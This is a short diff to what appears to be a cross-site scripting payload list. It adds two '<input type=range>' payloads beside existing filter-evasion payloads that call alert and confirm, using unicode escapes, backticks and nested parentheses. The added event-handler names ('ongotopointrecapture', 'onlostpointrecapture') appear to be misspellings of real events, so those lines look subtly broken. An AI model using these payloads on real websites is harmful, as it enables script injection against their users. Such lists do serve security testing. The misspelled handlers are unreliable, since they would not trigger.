@@ -79,6 +79,9 @@ document.body.appendChild(el);
 <input onblur=["_Y00!_"].find(alert) autofocus><input autofocus>
 <input onblur=(((confirm)))("_Y00!_") autofocus><input autofocus>
 
+<input type=range ongotopointrecapture=alert(1)>
+<input type=range onlostpointrecapture=alert(1)>
+
 <h1 onclick=\u0061\u006cert("_Y000!_")>Y00</h1>
 
 <h1 onmouseover= (((confirm)))`_Y000!_`>
